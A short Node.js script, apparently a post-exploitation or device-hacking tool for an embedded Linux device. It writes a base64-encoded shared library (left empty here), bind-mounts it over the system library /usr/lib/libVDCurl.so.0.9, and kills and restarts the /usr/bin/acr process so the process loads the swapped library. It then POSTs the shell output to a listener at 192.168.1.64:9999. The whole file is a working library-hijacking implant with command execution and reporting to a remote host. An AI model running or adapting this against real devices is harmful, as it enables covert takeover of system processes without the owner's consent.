"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var SO_B64 = "";

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 2500); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.started = new Date().toISOString();
out.rev = 2;
try {
    fs.writeFileSync("/opt/acr-ca/libVDCurl.so.0.9", new Buffer(SO_B64, "base64"));
    out.wrote = fs.statSync("/opt/acr-ca/libVDCurl.so.0.9").size;
} catch (e) { out.wrote = "ERR " + e.message; }
out.mount = sh("mount --bind /opt/acr-ca/libVDCurl.so.0.9 /usr/lib/libVDCurl.so.0.9 && echo BIND_OK; md5sum /opt/acr-ca/libVDCurl.so.0.9 /usr/lib/libVDCurl.so.0.9; dd if=/usr/lib/libVDCurl.so.0.9 bs=1 skip=48164 count=8 2>/dev/null | od -An -tx1");
out.restart = sh("kill $(ps -ef | grep '/usr/bin/acr' | grep -v grep | awk '{print $2}') 2>/dev/null; sleep 1; (nohup /usr/bin/acr >/tmp/acr.out 2>&1 &) ; sleep 3; ps -ef | grep -i acr | grep -v grep | head -3");
post("/vdcurl_install2", out);
